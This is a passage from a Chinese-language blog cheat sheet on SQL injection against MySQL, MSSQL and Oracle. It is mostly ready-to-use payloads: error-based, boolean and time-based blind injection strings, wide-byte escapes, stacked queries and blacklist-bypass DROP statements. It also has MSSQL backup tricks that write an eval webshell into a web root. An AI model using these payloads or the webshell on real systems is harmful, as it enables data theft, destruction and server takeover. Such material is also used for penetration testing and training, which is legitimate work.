!sqrt((select*from(select user())a))-~0;</span><br><span class="line">select !round((select*from(select user())a))-~0;</span><br><span class="line">select !sign((select*from(select user())a))-~0;</span><br><span class="line">select !floor((select*from(select user())a))-~0;</span><br><span class="line">select !tan((select*from(select user())a))-~0;</span><br><span class="line">select !ceiling((select*from(select user())a))-~0;</span><br><span class="line">select !exp((select*from(select user())x))-~0;</span><br><span class="line">select !(select*from(select user())a)-~1^200;</span><br></pre></td></tr></table></figure>
<h4 id="其他报错"><a href="#其他报错" class="headerlink" title="其他报错"></a>其他报错</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">polygon、multipoint、multilinestring、multipolygon、linestring</span><br><span class="line"></span><br><span class="line">得到库名：</span><br><span class="line">payload:</span><br><span class="line">select * from math1 where id=1 union select 1 from flag;</span><br><span class="line">ERROR 1146 (42S02): Table &#x27;myclass.flag&#x27; doesn&#x27;t exist</span><br><span class="line"></span><br><span class="line">得到表名：</span><br><span class="line">payload:</span><br><span class="line">select * from math1 where id=0 and linestring(id)</span><br><span class="line">ERROR 1367 (22007): Illegal non geometric &#x27;`myclass`.`math1`.`id`&#x27; value found during parsing</span><br></pre></td></tr></table></figure>
<h3 id="有显示但是无回显位的："><a href="#有显示但是无回显位的：" class="headerlink" title="有显示但是无回显位的："></a>有显示但是无回显位的：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(就是查询正确和查询错误页面返回结果不一致的)</span><br><span class="line">此类一般用盲注：</span><br><span class="line">payload:</span><br><span class="line">and ascii(substr((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),1,1))&gt;50)-- </span><br></pre></td></tr></table></figure>
<h3 id="无显示无回显的-时间盲注-："><a href="#无显示无回显的-时间盲注-：" class="headerlink" title="无显示无回显的(时间盲注)："></a>无显示无回显的(时间盲注)：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and if(ascii(substr((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),1,1))&gt;50,1,sleep(5))--+</span><br></pre></td></tr></table></figure>
<h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><h4 id="盲注场景："><a href="#盲注场景：" class="headerlink" title="盲注场景："></a>盲注场景：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1.通过前面的测试会发现页面没有回显提取的数据，但是根据语句是否执行成功与否会有一些相应的变化。</span><br><span class="line">2.正确/错误的语句使得页面有适度的变化。可以尝试使用布尔注入</span><br><span class="line">3.正确语句返回正常页面，错误的语句返回通用错误页面。可以尝试使用布尔注入。</span><br><span class="line">4.提交错误语句，不影响页面的正常输出。建议尝试使用延时注入。</span><br><span class="line"></span><br><span class="line">几种简单的判断语句，在真实利用中需要根据情况而变化:</span><br><span class="line">CASE</span><br><span class="line">IF()</span><br><span class="line">IFNULL()</span><br><span class="line">NULLIF()</span><br></pre></td></tr></table></figure>
<h4 id="布尔盲注-基于响应"><a href="#布尔盲注-基于响应" class="headerlink" title="布尔盲注-基于响应"></a>布尔盲注-基于响应</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">提交一个逻辑判断语句，来推断一个个的信息位。由于注入需要（一般）一个个字符的进行，所以需要利用脚本，或者工具（比如burp suite）。以下是：</span><br><span class="line">payload:</span><br><span class="line">// i 用于提取每一个位，j 用于判断其对应的ASCII码值的范围。</span><br><span class="line">// k ，结合limit，选择偏移为k的行</span><br><span class="line">// **中可以填上其他的select语句，比如查询表名，列名，数据。一次类推。</span><br><span class="line">// SUBSTR() 也可以换成 SUBSTRING()</span><br><span class="line">&#x27; OR (SELECT ASCII(SUBSTR(DATABASE(),i,1) ) &lt; j) #</span><br><span class="line">&#x27; OR (SELECT ASCII(SUBSTR((SELECT GROUP_CONCAT(schema_name SEPARATOR 0x3c62723e) FROM INFORMATION_SCHEMA.SCHEMATA),i,1) ) &lt; j) #  </span><br><span class="line">&#x27; OR (SELECT SUBSTR(DATABASE(),i,1) &lt; j) #</span><br><span class="line">&#x27; OR (SELECT SUBSTR((SELECT GROUP_CONCAT(schema_name SEPARATOR 0x3c62723e) FROM INFORMATION_SCHEMA.SCHEMATA),i,1) &lt; j) #  </span><br><span class="line">&#x27; OR SUBSTR((SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA LIMIT k,1),i,1) &lt; j #</span><br><span class="line">sqlmap的payload：</span><br><span class="line">//猜解表个数：</span><br><span class="line">2&#x27; AND ORD(MID((SELECT IFNULL(CAST(COUNT(table_name) AS NCHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=0x7365637572697479),1,1))&gt;51 AND &#x27;VgnR&#x27;=&#x27;VgnR</span><br><span class="line">//猜解表名：</span><br><span class="line">2&#x27; AND ORD(MID((SELECT IFNULL(CAST(table_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=0x7365637572697479 LIMIT 0,1),3,1))&gt;98 AND &#x27;EtEm&#x27;=&#x27;EtEm</span><br></pre></td></tr></table></figure>
<h4 id="延时盲注-基于时间"><a href="#延时盲注-基于时间" class="headerlink" title="延时盲注-基于时间"></a>延时盲注-基于时间</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">一般会用到几个函数。使用这些的效果，是为了延缓mysql的操作，从而检测到与平时有异的情况：</span><br><span class="line">SLEEP(n) 让mysql停n秒钟</span><br><span class="line">BENCHMARK(count,expr) 重复countTimes次执行表达式expr</span><br><span class="line"></span><br><span class="line">一些注意事项：</span><br><span class="line">使用基于时间的盲注比较不准确，因为这还取决于当前的网络环境。</span><br><span class="line">时间延缓最好不要超过30秒，否则容易导致mysql的API连接超时。</span><br><span class="line">当在页面上看不到任何明显变化时，再考虑选择使用延时注入。</span><br><span class="line"></span><br><span class="line">检测方法:</span><br><span class="line">1 and sleep(5)=0 limit 1 #</span><br><span class="line">1) OR SLEEP(25)=0 LIMIT 1 #</span><br><span class="line">1&#x27; OR SLEEP(25)=0 LIMIT 1 #</span><br><span class="line">&#x27;) OR SLEEP(25)=0 LIMIT 1 #</span><br><span class="line">1)) OR SLEEP(25)=0 LIMIT 1 #</span><br><span class="line">SELECT SLEEP(25) #</span><br><span class="line"></span><br><span class="line">延迟三秒:</span><br><span class="line">BENCHMARK(100000,SHA1(1))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload:</span><br><span class="line">if(xxxxx,1,sleep(2))</span><br><span class="line">UNION SELECT IF(SUBSTR((SELECT GROUP_CONCAT(schema_name SEPARATOR 0x3c62723e) FROM INFORMATION_SCHEMA.SCHEMATA),i,1) &lt; j,BENCHMARK(100000,SHA1(1)),0)</span><br><span class="line">UNION SELECT IF(SUBSTR((SELECT GROUP_CONCAT(schema_name SEPARATOR 0x3c62723e) FROM INFORMATION_SCHEMA.SCHEMATA),i,1) &lt; j,SLEEP(10),0)</span><br></pre></td></tr></table></figure>
<h4 id="盲注常用ascii"><a href="#盲注常用ascii" class="headerlink" title="盲注常用ascii"></a>盲注常用ascii</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">w=119</span><br><span class="line">f=102</span><br><span class="line">r=114</span><br><span class="line">o=111</span><br><span class="line">t=116</span><br><span class="line">u=117</span><br><span class="line">5=53</span><br><span class="line">1=49</span><br></pre></td></tr></table></figure>
<h3 id="特殊注入："><a href="#特殊注入：" class="headerlink" title="特殊注入："></a>特殊注入：</h3><h4 id="引号逃逸："><a href="#引号逃逸：" class="headerlink" title="引号逃逸："></a>引号逃逸：</h4><h5 id="宽字节逃逸："><a href="#宽字节逃逸：" class="headerlink" title="宽字节逃逸："></a>宽字节逃逸：</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">观察网页编码：</span><br><span class="line">&lt;meta charset=&quot;gb2312&quot; /&gt;</span><br><span class="line"></span><br><span class="line">GBK编码，它的编码范围是0x8140~0xFEFE（不包括xx7F），在遇到%df(ascii(223))&gt;ascii(128)时自动拼接%5c，因此吃掉&#x27;\&#x27;，而%27、%20小于ascii(128)的字符就保留了。</span><br><span class="line">补充：</span><br><span class="line">1.GB2312是被GBK兼容的，它的高位范围是0xA1~0xF7，低位范围是0xA1~0xFE（0x5C不在该范围内），因此不能使用编码吃掉%5c。其它的宽字符集也是一样的分析过程，要吃掉%5c，只需要低位中包含正常的0x5c就行了。</span><br><span class="line">2.Mysql编码与过滤函数推荐使用mysql_real_escape_string()，mysql_set_charset()。</span><br><span class="line">3.转编码函数同样会引起宽字节注入，即使使用了安全的设置函数。</span><br><span class="line">常用payload：</span><br><span class="line">%df%27</span><br><span class="line">%e5%5c%27</span><br><span class="line">%e9%8c%a6</span><br><span class="line">index.php?name=1%df&#x27;</span><br><span class="line">index.php?name=1%a1&#x27;</span><br><span class="line">index.php?name=1%aa&#x27;</span><br></pre></td></tr></table></figure>

<h5 id="转义逃逸"><a href="#转义逃逸" class="headerlink" title="转义逃逸"></a>转义逃逸</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">利用\转义</span><br><span class="line">payload:</span><br><span class="line">index.php?name=%**%5c%5c%27</span><br></pre></td></tr></table></figure>

<h4 id="图片注入"><a href="#图片注入" class="headerlink" title="图片注入"></a>图片注入</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">图片插入到数据库中，需要查询提取数据</span><br><span class="line">例题：</span><br><span class="line">http://lab1.xseclab.com/sqli6_f37a4a60a4a234cd309ce48ce45b9b00/images/dog1%df%27union%20select%201,2,user(),4%23.jpg</span><br></pre></td></tr></table></figure>

<h4 id="堆叠查询注入"><a href="#堆叠查询注入" class="headerlink" title="堆叠查询注入"></a>堆叠查询注入</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mysqli_multi_query函数，可以执行多行 SQL 语句</span><br><span class="line"></span><br><span class="line">payload:</span><br><span class="line">username=1&#x27;;set @sql=concat(&#x27;up&#x27;,&#x27;date `score` set listen=123 where username=&quot;火华&quot;&#x27;);prepare sql_exe FROM @sql;execute sql_exe#</span><br><span class="line">-1&#x27;;Set @sql = CONCAT(&#x27;se&#x27;,&#x27;lect * from `1919810931114514`;&#x27;);Prepare stmt from @sql;EXECUTE stmt;#</span><br></pre></td></tr></table></figure>
<h2 id="其他要点"><a href="#其他要点" class="headerlink" title="其他要点"></a>其他要点</h2><h3 id="易错点"><a href="#易错点" class="headerlink" title="易错点"></a>易错点</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">隐式转换：</span><br><span class="line">MariaDB [myclass]&gt; select &quot;-1&quot;=-1;</span><br><span class="line">+---------+</span><br><span class="line">| &quot;-1&quot;=-1 |</span><br><span class="line">+---------+</span><br><span class="line">|       1 |</span><br><span class="line">+---------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [myclass]&gt; select &quot;-1&quot;=1;</span><br><span class="line">+--------+</span><br><span class="line">| &quot;-1&quot;=1 |</span><br><span class="line">+--------+</span><br><span class="line">|      0 |</span><br><span class="line">+--------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">字符等于0：</span><br><span class="line">MariaDB [myclass]&gt; select &#x27;aaa&#x27;=0;</span><br><span class="line">+---------+</span><br><span class="line">| &#x27;aaa&#x27;=0 |</span><br><span class="line">+---------+</span><br><span class="line">|       1 |</span><br><span class="line">+---------+</span><br><span class="line">1 row in set, 1 warning (0.00 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [myclass]&gt; select &#x27;aaa&#x27;=1;</span><br><span class="line">+---------+</span><br><span class="line">| &#x27;aaa&#x27;=1 |</span><br><span class="line">+---------+</span><br><span class="line">|       0 |</span><br><span class="line">+---------+</span><br><span class="line">1 row in set, 1 warning (0.00 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [myclass]&gt; select &#x27;aaa&#x27;+123;</span><br><span class="line">+-----------+</span><br><span class="line">| &#x27;aaa&#x27;+123 |</span><br><span class="line">+-----------+</span><br><span class="line">|       123 |</span><br><span class="line">+-----------+</span><br><span class="line">1 row in set, 1 warning (0.00 sec)</span><br></pre></td></tr></table></figure>

<h3 id="Mysql字符编码利用技巧"><a href="#Mysql字符编码利用技巧" class="headerlink" title="Mysql字符编码利用技巧"></a>Mysql字符编码利用技巧</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">传入的username=admin%c2，php的检测if ($username === &#x27;admin&#x27;)自然就可以绕过的，在mysql中可以正常查出username=&#x27;admin&#x27;的结果</span><br><span class="line">原理是Mysql在转换字符集的时候，将不完整的字符给忽略了。</span><br><span class="line">具体可参照P师傅文章:https://www.leavesongs.com/PENETRATION/mysql-charset-trick.html</span><br></pre></td></tr></table></figure>

<h3 id="隐式类型转换"><a href="#隐式类型转换" class="headerlink" title="隐式类型转换"></a>隐式类型转换</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.字符串为：0 false</span><br><span class="line">2.非零数字+字符串为：非0数字 ture</span><br><span class="line">3.零+字符串为：0 false</span><br><span class="line">总结：mysql也会把字符串强制转化为开头的数字，若开头是字母则强制转化为0</span><br></pre></td></tr></table></figure>
<h2 id="版本特性"><a href="#版本特性" class="headerlink" title="版本特性"></a>版本特性</h2><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql5.0以后 information.schema库出现</span><br><span class="line">mysql5.1以后 udf 导入xx\lib\plugin\ 目录下</span><br><span class="line">mysql5.x以后 system执行命令</span><br></pre></td></tr></table></figure>

<h2 id="最新技术"><a href="#最新技术" class="headerlink" title="最新技术"></a>最新技术</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SQL注入的两个小Trick与总结</span><br><span class="line">https://www.anquanke.com/post/id/158674</span><br></pre></td></tr></table></figure>

<h1 id="Mssql注入"><a href="#Mssql注入" class="headerlink" title="Mssql注入"></a>Mssql注入</h1><h2 id="基础知识-1"><a href="#基础知识-1" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="常用payload"><a href="#常用payload" class="headerlink" title="常用payload"></a>常用payload</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">初步注入：</span><br><span class="line">Version             SELECT @@VERSION</span><br><span class="line">Current User        SELECT user_name();</span><br><span class="line">                    SELECT system_user;</span><br><span class="line">                    SELECT user;</span><br><span class="line">                    SELECT loginame FROM master..sysprocesses WHERE spid = @@SPID </span><br><span class="line">Current Database    SELECT db_name()</span><br></pre></td></tr></table></figure>

<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Error Based SQLi</span><br><span class="line">For integer inputs : convert(int,@@version)</span><br><span class="line">For string inputs  : &#x27; + convert(int,@@version) +&#x27;</span><br><span class="line"></span><br><span class="line">The attacks above should throw conversion errors.</span><br><span class="line">Clear SQLi Tests These tests are simply good for boolean sql injection and silent attacks.</span><br><span class="line"></span><br><span class="line">product.asp?id=4</span><br><span class="line">product.asp?id=5-1</span><br><span class="line">product.asp?id=4 OR 1=1</span><br></pre></td></tr></table></figure>

<h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">WAITFOR DELAY</span><br><span class="line">&#x27;0:0:10&#x27;--</span><br><span class="line">Real World Samples ProductID=1;waitfor delay &#x27;0:0:10&#x27;--</span><br><span class="line">ProductID=1);waitfor delay &#x27;0:0:10&#x27;--</span><br><span class="line">ProductID=1&#x27;;waitfor delay &#x27;0:0:10&#x27;--</span><br><span class="line">ProductID=1&#x27;);waitfor delay &#x27;0:0:10&#x27;--</span><br><span class="line">ProductID=1));waitfor delay &#x27;0:0:10&#x27;--</span><br><span class="line"></span><br><span class="line">注释：</span><br><span class="line">DROP sampletable;--</span><br><span class="line">DROP sampletable;# </span><br><span class="line">Username: admin&#x27;--</span><br><span class="line">SELECT * FROM members WHERE username = &#x27;admin&#x27;--&#x27; AND password = &#x27;password&#x27;</span><br><span class="line"></span><br><span class="line">DROP/*comment*/sampletable</span><br><span class="line">DR/**/OP/*bypass blacklisting*/sampletable</span><br></pre></td></tr></table></figure>

<h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">SQL Server If Statement</span><br><span class="line">IF condition true-part ELSE false-part (S)</span><br><span class="line">IF (1=1) SELECT &#x27;true&#x27; ELSE SELECT &#x27;false&#x27;</span><br><span class="line">If Statement SQL Injection Attack Samples</span><br><span class="line"></span><br><span class="line">if ((select user) = &#x27;sa&#x27; OR (select user) = &#x27;dbo&#x27;) select 1 else select 1/0 (S)</span><br><span class="line">This will throw an divide by zero error if current logged user is not &quot;sa&quot; or &quot;dbo&quot;.</span><br><span class="line"></span><br><span class="line">绕过逗号：</span><br><span class="line">SELECT CHAR(75)+CHAR(76)+CHAR(77)</span><br><span class="line">This will return &#x27;KLM&#x27;.</span><br></pre></td></tr></table></figure>

<h2 id="特殊查询"><a href="#特殊查询" class="headerlink" title="特殊查询"></a>特殊查询</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlserver查找某个字段在哪张表里</span><br><span class="line"><span class="keyword">select</span> [name] <span class="keyword">from</span> [库名].[dbo].sysobjects <span class="keyword">where</span> id <span class="keyword">in</span>(<span class="keyword">select</span> id <span class="keyword">from</span> [库名].[dbo].syscolumns <span class="keyword">Where</span> name<span class="operator">=</span><span class="string">&#x27;字段名&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="执行命令"><a href="#执行命令" class="headerlink" title="执行命令"></a>执行命令</h2><p>mssql注入技巧</p>
<p><a target="_blank" rel="noopener" href="https://www.waitalone.cn/sqlserver-inject-skills.html">https://www.waitalone.cn/sqlserver-inject-skills.html</a></p>
<p>MSSQL多种姿势拿shell和提权</p>
<p><a target="_blank" rel="noopener" href="https://y4er.com/post/mssql-getshell/#getshell">https://y4er.com/post/mssql-getshell/#getshell</a></p>
<h2 id="dba权限-sa"><a href="#dba权限-sa" class="headerlink" title="dba权限(sa)"></a>dba权限(sa)</h2><h3 id="xp-cmdshell提权"><a href="#xp-cmdshell提权" class="headerlink" title="xp_cmdshell提权"></a>xp_cmdshell提权</h3><h3 id="sp-oacreate提权"><a href="#sp-oacreate提权" class="headerlink" title="sp_oacreate提权"></a>sp_oacreate提权</h3><h2 id="db-owner权限"><a href="#db-owner权限" class="headerlink" title="db_owner权限"></a>db_owner权限</h2><h3 id="Log备份Getshell"><a href="#Log备份Getshell" class="headerlink" title="Log备份Getshell"></a>Log备份Getshell</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">;alter database test set RECOVERY FULL--</span><br><span class="line">;create table cmd (a image)--</span><br><span class="line">;backup log test to disk = &#x27;c:/1.bak&#x27; with init--</span><br><span class="line">;insert into cmd (a) values (&#x27;&lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;saul&quot;],&quot;unsafe&quot;);%&gt;&#x27;)--</span><br><span class="line">;backup log test to disk = &#x27;c:\inetpub\wwwroot\saul.aspx&#x27;--</span><br><span class="line">;drop table cmd--</span><br></pre></td></tr></table></figure>

<h3 id="差异备份Getshell"><a href="#差异备份Getshell" class="headerlink" title="差异备份Getshell"></a>差异备份Getshell</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. backup database 库名 to disk = &#x27;c:\bak.bak&#x27;;--</span><br><span class="line">2. create table [dbo].[test] ([cmd] [image]);--</span><br><span class="line">3. insert into test(cmd) values(&#x27;&lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;saul&quot;],&quot;unsafe&quot;);%&gt;&#x27;)--</span><br><span class="line">4. backup database 库名 to disk=&#x27;C:\d.asp&#x27; WITH DIFFERENTIAL,FORMAT;--</span><br></pre></td></tr></table></figure>

<h2 id="public权限"><a href="#public权限" class="headerlink" title="public权限"></a>public权限</h2><h1 id="Oracle注入"><a href="#Oracle注入" class="headerlink" title="Oracle注入"></a>Oracle注入</h1><h2 id="识别注入点"><a href="#识别注入点" class="headerlink" title="识别注入点"></a>识别注入点</h2><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">判断注入点：</span><br><span class="line">使用经典的单引号,and 1=1,1=2即可，视具体环境可能需要进行一些绕过的操作</span><br><span class="line"></span><br><span class="line">确定数据库类型payload:</span><br><span class="line">||,如and &#x27;12&#x27;=&#x27;1&#x27;||&#x27;2&#x27;</span><br><span class="line">and exists(select * from dual/user_tables)</span><br></pre></td></tr></table></figure>

<h2 id="显错注入"><a href="#显错注入" class="headerlink" title="显错注入"></a>显错注入</h2><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">在能够显示出具体报错信息的情况下，个人更加倾向使用报错注入，这样能够以一个更快的速度，去获取我们想要的信息</span><br><span class="line"></span><br><span class="line">常用函数：</span><br><span class="line">utl_inaddr.get_host_name()    #这个支持oracle10及以下，不支持oracle11</span><br><span class="line">ctxsys.drithsx.sn()           #这个支持oracle11</span><br><span class="line"></span><br><span class="line">测试:</span><br><span class="line">utl_inaddr.get_host_name()</span><br></pre></td></tr></table></figure>

<p><img src="/../images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/image-20251217172612947.png" alt="image-20251217172612947"></p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctxsys.drithsx.sn()</span><br></pre></td></tr></table></figure>

<p><img src="/../images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/image-20251217172723669.png" alt="image-20251217172723669"></p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">两个测试都可以得到连接用户为DATASPT</span><br><span class="line"></span><br><span class="line">payload:</span><br><span class="line">or 1=utl_inaddr.get_host_address((sql注入语句))</span><br><span class="line"></span><br><span class="line">注意：这里要加双层括号，否则会提示缺失表达式；以及注意短路求值机制，我们必须让这条语句得到执行，另外优先级为先and后or</span><br><span class="line"></span><br><span class="line">这个函数的本意是获取ip地址，但是如果传递参数无法得到解析就会返回一个oracle错误并显示传递的参数。我们传递的是一个sql语句所以返回的就是语句执行的结果。oracle在启动之后，把一些系统变量都放置到一些特定的视图当中，可以利用这些视图获得想要的东西。通常非常重要的信息有：</span><br><span class="line">1 当前用户权限 select * from session_roles where rownum=1</span><br><span class="line">2 当前数据库版本 select banner from sys.v_$version where rownum=1</span><br><span class="line">3 服务器出口IP 用utl_http.request 可以实现</span><br><span class="line">4 服务器监听IP select utl_inaddr.get_host_address from dual</span><br><span class="line">5 服务器操作系统 select member from v$logfile where rownum=1</span><br><span class="line">6 服务器sid 远程连接的话需要，select instance_name fromv$instance; &#x27; n</span><br><span class="line">7 当前连接用户 select SYS_CONTEXT (&#x27;USERENV&#x27;, &#x27;CURRENT_USER&#x27;)from dual</span><br><span class="line">信息收集完毕，开始注入，先来查找可能含有后台密码信息表和列：</span><br><span class="line">查看名字类似于PASSWORD的表有几个：</span><br><span class="line">select count(*) from user_tab_columns where column_name like &#x27;%25PASS%25&#x27;</span><br><span class="line"></span><br><span class="line">接下来，鉴于使用where rownum=1 and 